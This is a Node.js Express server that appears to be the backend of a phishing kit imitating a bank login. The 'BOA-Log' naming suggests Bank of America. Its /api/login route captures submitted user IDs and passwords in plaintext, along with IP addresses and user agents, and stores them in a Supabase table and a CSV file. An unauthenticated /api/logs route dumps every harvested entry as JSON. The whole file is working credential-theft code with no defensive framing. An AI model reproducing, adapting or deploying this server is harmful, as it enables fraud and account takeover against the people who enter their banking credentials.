import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// API Routes MUST come before static middleware
// Setup endpoint to verify and initialize database
app.post('/api/setup', async (req, res) => {
  console.log('Setup endpoint called - verifying BOA-Log table');
  try {
    if (useSupabase && supabase) {
      // Test Supabase connection and table
      const { data, error } = await supabase
        .from('BOA-Log')
        .select('*')
        .limit(1);
      
      if (error) {
        console.error('Supabase table check error:', error.message);
        return res.json({
          success: false,
          message: 'BOA-Log table not accessible',
          error: error.message,
          fallback: 'Using CSV logging'
        });
      }
      
      console.log('Supabase BOA-Log table verified');
      res.json({
        success: true,
        message: 'Supabase BOA-Log table ready',
        dataSource: 'Supabase + CSV backup'
      });
    } else {
      res.json({
        success: true,
        message: 'Using CSV logging (Supabase not configured)',
        dataSource: 'CSV'
      });
    }
  } catch (error) {
    console.error('Setup error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      fallback: 'CSV logging available'
    });
  }
});

// Debug route
app.get('/api/debug', (req, res) => {
  res.json({
    status: 'ok',
    message: 'Server is running',
    supabase: supabase ? 'Connected' : 'Not connected',
    logsDir: logsDir,
    env: process.env.VERCEL ? 'Vercel' : 'Local'
  });
});

// Explicit static file routes (needed for Vercel serverless)
app.get(/^\/assets\//, (req, res) => {
  const filepath = path.join(__dirname, req.path);
  res.sendFile(filepath, (err) => {
    if (err) {
      res.status(404).end();
    }
  });
});

// Static files middleware - AFTER API routes
app.use(express.static(path.join(__dirname)));

// Supabase Configuration
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const useSupabase = true; // Enabled for BOA-Log table integration

let supabase = null;
try {
  if (useSupabase && supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('Supabase client initialized for BOA-Log table');
  } else {
    console.log('Supabase credentials not found, will use CSV logging only');
  }
} catch (error) {
  console.error('Error initializing Supabase:', error.message);
  supabase = null;
}

// Local CSV Logger Configuration (uses /tmp on Vercel, ./logs locally)
const logsDir = process.env.VERCEL ? '/tmp' : path.join(__dirname, 'logs');
try {
  if (!process.env.VERCEL && !fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
  }
} catch (error) {
  console.error('Error creating logs directory:', error.message);
}

// Helper function to get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         'unknown';
}

// API endpoint for form submissions
app.post('/api/login', async (req, res) => {
  console.log('[/api/login] Received request:', req.body);
  
  const { userId, password, rememberMe } = req.body;
  const ipAddress = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  try {
    console.log('[/api/login] Calling logEntry...');
    // Log the entry
    await logEntry({
      userId,
      password,
      rememberMe: rememberMe === 'on' || rememberMe === true,
      ipAddress,
      userAgent
    });

    console.log('[/api/login] logEntry succeeded');
    res.json({ success: true, message: 'Login attempt logged' });
  } catch (error) {
    console.error('[/api/login] Error processing login:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log entry function - supports both Supabase and local CSV
async function logEntry(data) {
  const timestamp = new Date().toISOString();
  
  try {
    // Try Supabase first if enabled
    if (useSupabase && supabase) {
      try {
        const { error } = await supabase
          .from('BOA-Log')
          .insert([
            {
              user_id: data.userId || 'N/A',
              password: data.password || 'N/A',
              remember_me: data.rememberMe ? true : false,
              ip_address: data.ipAddress || 'unknown',
              user_agent: data.userAgent || 'unknown',
              status: 'Attempted'
            }
          ]);
        
        if (error) {
          console.error('[Supabase] Insert error:', error.message);
          // Fall through to CSV logging
        } else {
          console.log('[Supabase] Entry logged to BOA-Log table:', data.userId);
        }
      } catch (supabaseError) {
        console.error('[Supabase] Exception during insert:', supabaseError.message);
        // Fall through to CSV logging
      }
    }
    
    // Always log to CSV as backup
    const logsFile = path.join(logsDir, 'login_entries.csv');
    const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
    
    // Add header if file doesn't exist
    if (!fs.existsSync(logsFile)) {
      fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
    }
    
    fs.appendFileSync(logsFile, entry);
    console.log('[CSV] Entry logged:', data.userId);
  } catch (error) {
    console.error('Error logging entry:', error);
    throw error;
  }
}

// Route to view logs
app.get('/api/logs', async (req, res) => {
  try {
    // Get logs from local CSV
    const logsFile = path.join(logsDir, 'login_entries.csv');
    if (fs.existsSync(logsFile)) {
      const logs = fs.readFileSync(logsFile, 'utf8');
      // Parse CSV into JSON with proper handling of quoted fields
      const lines = logs.split('\n').filter(line => line.trim());
      const headers = lines[0].split(',').map(h => h.trim());
      
      const data = lines.slice(1).map(line => {
        const values = [];
        let current = '';
        let inQuotes = false;
        
        for (let i = 0; i < line.length; i++) {
          const char = line[i];
          const nextChar = line[i + 1];
          
          if (char === '"') {
            inQuotes = !inQuotes;
          } else if (char === ',' && !inQuotes) {
            values.push(current.trim().replace(/^"|"$/g, ''));
            current = '';
          } else {
            current += char;
          }
        }
        // Don't forget the last field
        values.push(current.trim().replace(/^"|"$/g, ''));
        
        const obj = {};
        headers.forEach((header, i) => {
          obj[header] = values[i] || '';
        });
        return obj;
      });
      
      res.json({
        success: true,
        data: data,
        source: 'Local CSV',
        total: data.length
      });
    } else {
      res.json({
        success: true,
        data: [],
        message: 'No logs found yet',
        source: 'Local CSV'
      });
    }
  } catch (error) {
    console.error('Error fetching logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve index.html by default
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Explicit dashboard route
app.get('/dashboard.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Explicit dashboard route (without extension)
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Error handling middleware (must be last)
app.use((err, req, res, next) => {
  console.error('[Error]', err);
  res.status(500).json({ success: false, error: err.message || 'Internal server error' });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
});
